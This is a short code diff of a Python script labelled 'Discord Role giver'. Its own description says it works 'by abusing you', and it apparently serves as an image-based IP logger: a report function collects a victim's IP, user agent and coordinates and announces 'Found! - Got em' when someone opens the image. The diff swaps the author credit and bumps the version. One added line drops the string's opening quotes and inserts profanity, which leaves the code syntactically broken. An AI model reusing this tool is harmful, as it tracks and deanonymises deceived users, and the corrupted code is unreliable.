@@ -7,8 +7,8 @@ import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Role giver"
 __description__ = "A simple application which allows you to give roles and more by abusing you."
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__version__ = "v2.1"
+__author__ = "Fellowyyy"
 
 config = {
     # BASE CONFIG #
@@ -146,7 +146,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Found! - Got em",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": mothafuckA User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
             
